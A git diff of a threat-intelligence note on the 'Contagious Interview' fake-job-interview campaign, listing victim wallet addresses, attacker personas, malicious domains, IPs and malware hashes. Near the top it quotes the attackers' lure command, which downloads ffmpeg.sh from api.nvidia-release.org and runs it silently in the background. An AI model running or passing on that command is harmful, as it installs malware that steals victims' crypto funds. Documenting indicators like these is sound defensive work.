@@ -12,9 +12,9 @@ Tags:: 🎙️ Contagious Interview
 
 `curl -k -o /var/tmp/ffmpeg.sh https://api.nvidia-release.org/ffmpeg-ja.sh && chmod +x /var/tmp/ffmpeg.sh && nohup bash /var/tmp/ffmpeg.sh >/dev/null 2>&1 &`
 
+> Please follow this link to complete the interview: 
 
-> Please follow this link to complete the interview: `https://willointerview.com/invite/halliday`
-
+- `https://willointerview.com/invite/halliday`
 
 - BCPKcYy6GQFVMLpdFq8iLwYjHE4GEXvwM1jCpUrg6mU4 - Theft from Victim 1, SOL
 - 0x66fe228806e3ce9fd06c8dbb9698014e8dc6ae56 - Theft from Victim 1, ETH BASE
@@ -28,7 +28,6 @@ Tags:: 🎙️ Contagious Interview
 
 
 ## Details - Victim 2
-
 
 - 0xf5a46FF0d81Aef7972Cb5f28243541CFF6D6fEb3 - Victim 2
 - 0x0b4eCF28692614C10Deb7d8579F4878Be3Fd2DE9 - Victim 2
@@ -44,9 +43,8 @@ Tags:: 🎙️ Contagious Interview
 ## Details - Victim 3
 
 - Linkedin / Kraken impersonation
-
 - 8s625QRcb8q349p1evDsyzYJ7Npwkh9KfHY1s3XSztVF - Theft from Victim 3
-
+- 0xbd848d23d3fce0acef833dfe43b6cb6e23d8f5c2 - Theft from Victim 3
 
 
 ## Details - Near Miss
@@ -77,150 +75,157 @@ Tags:: 🎙️ Contagious Interview
 
 ## Hunting
 
-    - https://app.validin.com/detail?find=%3A%3A%22og%3Adescription%22%3A%22description%22%3A%22Willo%20is%20a%20platform%20for%20structured%2C%20asynchronous%2C%20video%20creation%20and%20sharing.%20We%20help%20organisations%20everywhere%20discover%20and%20connect%20with%20more%20people.%22&type=raw&ref_id=a33de82ac6e#tab=host_pairs (# 2024-12-28)
-    - https://github.com/stamparm/maltrail/blob/master/trails/static/malware/apt_lazarus.txt#L3908-L4024
-    - https://mp.weixin.qq.com/s?__biz=MzUyMjk4NzExMA==&mid=2247505438&idx=1&sn=cf1947c7af6581f4a66460ae6d14dc2f
-    - https://urlscan.io/search/#hash%3A6b7038bab8c410aeb6714e1d98d609a61b6dc3e418a6b5c74a17f2d6d6cb4aaf
-    - https://www.virustotal.com/gui/file/33be1a646e5ed46aa707455637e2116715592d1ef63feafb0fd2f66c872a634d/detection    
-    - https://www.virustotal.com/gui/file/a803c043e12a5dac467fae092b75aa08b461b8e9dd4c769cea375ff87287a361/detection
-    - https://www.virustotal.com/gui/file/d05f805d172583f1436eac2cfddcc5413ef6be0b37eda98ebca0cb0cfae8ad9e/detection
-    - https://www.virustotal.com/gui/ip-address/162.254.39.9/relations
-    - https://x.com/banthisguy9349/status/1873329177312875005
-    - https://x.com/banthisguy9349/status/1873330847472107876
-    - https://x.com/banthisguy9349/status/1873335917039255557
-    - https://x.com/banthisguy9349/status/1873338361928466759
-    - https://x.com/banthisguy9349/status/1873348678540493273
-    - https://x.com/dimitribest/status/1873024742690857009
-    - https://x.com/dimitribest/status/1873343968894689472
-    - https://x.com/dimitribest/status/1873367811822903765
-    - https://x.com/lazarusholic/status/1873360845939621945
-    - https://x.com/StrikeReadyLabs/status/1873173874738880943
-    - https://x.com/StrikeReadyLabs/status/1873175327566119203
-    - https://x.com/StrikeReadyLabs/status/1873182889128673422
-    - https://x.com/StrikeReadyLabs/status/1873388149566747069
-    - https://x.com/tayvano_/status/1872980013542457802
+- https://app.validin.com/detail?find=%3A%3A%22og%3Adescription%22%3A%22description%22%3A%22Willo%20is%20a%20platform%20for%20structured%2C%20asynchronous%2C%20video%20creation%20and%20sharing.%20We%20help%20organisations%20everywhere%20discover%20and%20connect%20with%20more%20people.%22&type=raw&ref_id=a33de82ac6e#tab=host_pairs (# 2024-12-28)
+- https://github.com/stamparm/maltrail/blob/master/trails/static/malware/apt_lazarus.txt#L3908-L4024
+- https://mp.weixin.qq.com/s?__biz=MzUyMjk4NzExMA==&mid=2247505438&idx=1&sn=cf1947c7af6581f4a66460ae6d14dc2f
+- https://urlscan.io/search/#hash%3A6b7038bab8c410aeb6714e1d98d609a61b6dc3e418a6b5c74a17f2d6d6cb4aaf
+- https://www.virustotal.com/gui/file/33be1a646e5ed46aa707455637e2116715592d1ef63feafb0fd2f66c872a634d/detection    
+- https://www.virustotal.com/gui/file/a803c043e12a5dac467fae092b75aa08b461b8e9dd4c769cea375ff87287a361/detection
+- https://www.virustotal.com/gui/file/d05f805d172583f1436eac2cfddcc5413ef6be0b37eda98ebca0cb0cfae8ad9e/detection
+- https://www.virustotal.com/gui/ip-address/162.254.39.9/relations
+
+- https://x.com/banthisguy9349/status/1873329177312875005
+- https://x.com/banthisguy9349/status/1873330847472107876
+- https://x.com/banthisguy9349/status/1873335917039255557
+- https://x.com/banthisguy9349/status/1873338361928466759
+- https://x.com/banthisguy9349/status/1873348678540493273
+- https://x.com/dimitribest/status/1873024742690857009
+- https://x.com/dimitribest/status/1873343968894689472
+- https://x.com/dimitribest/status/1873367811822903765
+- https://x.com/lazarusholic/status/1873360845939621945
+- https://x.com/StrikeReadyLabs/status/1873173874738880943
+- https://x.com/StrikeReadyLabs/status/1873175327566119203
+- https://x.com/StrikeReadyLabs/status/1873182889128673422
+- https://x.com/StrikeReadyLabs/status/1873388149566747069
+- https://x.com/tayvano_/status/1872980013542457802
+- https://x.com/MalasadaTech/status/1873504113339871627
 
 
-### Personas: 
-    - Laura Rotta - https://www.linkedin.com/in/laura-r-480309340/
-    - Daniel Joseph Holyhead - https://www.linkedin.com/in/daniel-joseph-holyhead-a3011733a
-    - Marianne Totterdell
-    - Trevor Greer trevorgreer9312@gmail.com https://github.com/trevor9312 104.223.97.2 (Astrill), 91.239.130.102 (Astrill)
+### Personas:
+
+- Laura Rotta - https://www.linkedin.com/in/laura-r-480309340/
+- Daniel Joseph Holyhead - https://www.linkedin.com/in/daniel-joseph-holyhead-a3011733a
+- Marianne Totterdell
+- Trevor Greer trevorgreer9312@gmail.com https://github.com/trevor9312 104.223.97.2 (Astrill), 91.239.130.102 (Astrill)
 
 
 
 ### URLs:
-    - `app.crypto-assessment/invite/cryptoTrader`
-    - `willointerview.com/invite/halliday`
-    - `willoassess.net/invite/Aweras`
-    - `web.videoscreening.org/invite/netherminddefi`
-    - `willointerview.com/invite/tforce`
-    
-    - `216.74.123.191:22`
-    - `216.74.123.191:3001`
-    - `216.74.123.191:8080`
-    - `api.camera-drive.cloud`
-    - `api.jz-aws.info`
-    - `api.nvidia-drive.cloud`
-    - `nvidia-release.org`
-    - `nvidia-release.us`
-    - `api.nvidia-release.org/ffmpeg-ar.sh`
-    - `api.nvidia-release.org`
-    - `api.nvidia-release.us`
-    - `app.crypto-assessment.com`
-    - `app.hiringinterview.org`
-    - `app.hiringtalent.pro`
-    - `app.interviewnest.org`
-    - `app.videoscreening.org`
-    - `app.willo-interview.us`
-    - `app.willoassess.com`
-    - `api.willoassessment.com`    
-    - `app.willoassessment.com`
-    - `app.willocandidate.com`
-    - `app.willohiring.com`
-    - `app.willohiringtalent.org`
-    - `app.willomexcvip.us`
-    - `app.willorecruit.com`
-    - `app.willotalant.com`
-    - `app.willotalent.pro`
-    - `app.willotalent.us`
-    - `app.willotalent.xyz`
-    - `app.willotalentes.com`
-    - `app.willotalents.org`
-    - `app.wtalents.us`
-    - `blockchain-assess.com`
-    - `app.blockchain-assess.com`  
-    - `vid.blockchain-assess.com`      
-    - `camera-drive.cloud`
-    - `consensys.willoassessment.com`
-    - `cpanel.wtalents.us`
-    - `crypto-assessment.com`
-    - `d12rlkj8v5mwse.cloudfront.net`
-    - `d1yzmjg018adwf.cloudfront.net`
-    - `d20zx0lguyxj2p.cloudfront.net`
-    - `d3o9p0hkd7eul5.cloudfront.net`
-    - `dal-shared-22.hostwindsdns.com`
-    - `dal-shared-25.hostwindsdns.com`
-    - `dal-shared-37.hostwindsdns.com`
-    - `final.hiringtalent.pro`
-    - `fundcandidates.com`
-    - `gemini.crypto-assessment.com`
-    - `gemini.willoassess.com`
-    - `gemini.willohiring.com`
-    - `gemini.willohiringtalent.org`
-    - `geminiskill.willoassessment.com`
-    - `hiring.willoassessment.com`
-    - `hiringinterview.org`
-    - `hiringtalent.pro`
-    - `hyphen-connect.com`
-    - `interviewnest.org`
-    - `jz-aws.info`
-    - `mail.willomexcvip.us`
-    - `mail.wtalents.us`
-    - `sea-shared-10.hostwindsdns.com`
-    - `talent.willo-interview.us`
-    - `talentcompetency.com`
-    - `vid.willoassess.com`
-    - `videoscreening.org`
-    - `web.videoscreening.org`
-    - `werhiring.willomexcvip.us`
-    - `wiilotalent.com`
-    - `wilio-talent.net`
-    - `willo-interview.us`
-    - `willo-video.com`
-    - `willoassess.com`
-    - `willoassess.net`
-    - `willoassess.org`
-    - `willoassessment.com`
-    - `willocandidate.com`
-    - `willohire.com`
-    - `willohiring.com`
-    - `willohiringtalent.org`
-    - `willointerview.com`
-    - `willomexcvip.us`
-    - `willorecruit.com`
-    - `willotalant.com`
-    - `willotalent.pro`
-    - `willotalent.us`
-    - `willotalent.xyz`
-    - `willotalentes.com`
-    - `willotalents.org`
-    - `wtalents.us`
+
+- `app.crypto-assessment/invite/cryptoTrader`
+- `willointerview.com/invite/halliday`
+- `willoassess.net/invite/Aweras`
+- `web.videoscreening.org/invite/netherminddefi`
+- `willointerview.com/invite/tforce`
+
+- `216.74.123.191:22`
+- `216.74.123.191:3001`
+- `216.74.123.191:8080`
+- `api.camera-drive.cloud`
+- `api.jz-aws.info`
+- `api.nvidia-drive.cloud`
+- `nvidia-release.org`
+- `nvidia-release.us`
+- `api.nvidia-release.org/ffmpeg-ar.sh`
+- `api.nvidia-release.org`
+- `api.nvidia-release.us`
+- `app.crypto-assessment.com`
+- `app.hiringinterview.org`
+- `app.hiringtalent.pro`
+- `app.interviewnest.org`
+- `app.videoscreening.org`
+- `app.willo-interview.us`
+- `app.willoassess.com`
+- `api.willoassessment.com`    
+- `app.willoassessment.com`
+- `app.willocandidate.com`
+- `app.willohiring.com`
+- `app.willohiringtalent.org`
+- `app.willomexcvip.us`
+- `app.willorecruit.com`
+- `app.willotalant.com`
+- `app.willotalent.pro`
+- `app.willotalent.us`
+- `app.willotalent.xyz`
+- `app.willotalentes.com`
+- `app.willotalents.org`
+- `app.wtalents.us`
+- `blockchain-assess.com`
+- `app.blockchain-assess.com`  
+- `vid.blockchain-assess.com`      
+- `camera-drive.cloud`
+- `consensys.willoassessment.com`
+- `cpanel.wtalents.us`
+- `crypto-assessment.com`
+- `d12rlkj8v5mwse.cloudfront.net`
+- `d1yzmjg018adwf.cloudfront.net`
+- `d20zx0lguyxj2p.cloudfront.net`
+- `d3o9p0hkd7eul5.cloudfront.net`
+- `dal-shared-22.hostwindsdns.com`
+- `dal-shared-25.hostwindsdns.com`
+- `dal-shared-37.hostwindsdns.com`
+- `final.hiringtalent.pro`
+- `fundcandidates.com`
+- `gemini.crypto-assessment.com`
+- `gemini.willoassess.com`
+- `gemini.willohiring.com`
+- `gemini.willohiringtalent.org`
+- `geminiskill.willoassessment.com`
+- `hiring.willoassessment.com`
+- `hiringinterview.org`
+- `hiringtalent.pro`
+- `hyphen-connect.com`
+- `interviewnest.org`
+- `jz-aws.info`
+- `mail.willomexcvip.us`
+- `mail.wtalents.us`
+- `sea-shared-10.hostwindsdns.com`
+- `talent.willo-interview.us`
+- `talentcompetency.com`
+- `vid.willoassess.com`
+- `videoscreening.org`
+- `web.videoscreening.org`
+- `werhiring.willomexcvip.us`
+- `wiilotalent.com`
+- `wilio-talent.net`
+- `willo-interview.us`
+- `willo-video.com`
+- `willoassess.com`
+- `willoassess.net`
+- `willoassess.org`
+- `willoassessment.com`
+- `willocandidate.com`
+- `willohire.com`
+- `willohiring.com`
+- `willohiringtalent.org`
+- `willointerview.com`
+- `willomexcvip.us`
+- `willorecruit.com`
+- `willotalant.com`
+- `willotalent.pro`
+- `willotalent.us`
+- `willotalent.xyz`
+- `willotalentes.com`
+- `willotalents.org`
+- `wtalents.us`
 
 
 ### Hashes:
-    - `nvidia-real.zip` `nvidiaupdate.zip` e52118fc7fc9b14e5a8d9f61dfae8b140488ae6ec6f01f41d9e16782febad5f2
-    - `ffmpeg.sh` c6472eb993612db72ca50893a34137ba11173e60a1a4c028d4660a3f755d2490
-    - `ffmpeg.sh` a803c043e12a5dac467fae092b75aa08b461b8e9dd4c769cea375ff87287a361
-    - `logd` d05f805d172583f1436eac2cfddcc5413ef6be0b37eda98ebca0cb0cfae8ad9e
-    - `file.zip` 96e78074218a0f272f7f94805cabde1ef8d64ffb 
-    - `nodejs.zip` 86dea05a8f40cf3195e3a6056f2e968c861ed8f1 
-    - `nvidia-real.zip` 321972e4e72c5364ec1d5b9e488d15c641fb1819 
-    - `VCam_arm64.zip` 3405469811bae511e62cb0a4062aadb523cad263 
-    - `VCam_intel.zip` c0baa450c5f3b6aacde2807642222f6d22d5b4bb 
+
+- `logd` d05f805d172583f1436eac2cfddcc5413ef6be0b37eda98ebca0cb0cfae8ad9e
+- `file.zip` 96e78074218a0f272f7f94805cabde1ef8d64ffb 
+- `nodejs.zip` 86dea05a8f40cf3195e3a6056f2e968c861ed8f1 
+- `ffmpeg.sh` `a803c043e12a5dac467fae092b75aa08b461b8e9dd4c769cea375ff87287a361`
+- `ffmpeg.sh` `c6472eb993612db72ca50893a34137ba11173e60a1a4c028d4660a3f755d2490`
+- `nvidia-real.zip` `nvidiaupdate.zip` - `e52118fc7fc9b14e5a8d9f61dfae8b140488ae6ec6f01f41d9e16782febad5f2`
+- `VCam_arm64.zip` - `3405469811bae511e62cb0a4062aadb523cad263`
+- `VCam_intel.zip` - `60ec2dbe8cfacdff1d4eb093032b0307e52cc68feb1f67487d9f401017c3edd7`
 
 
 ## Images
+
+
+![](../images/2024-12-10_01_CI_Willo.png)
 
 ![](../images/2024-12-12_01_CI_Willo.png)
 
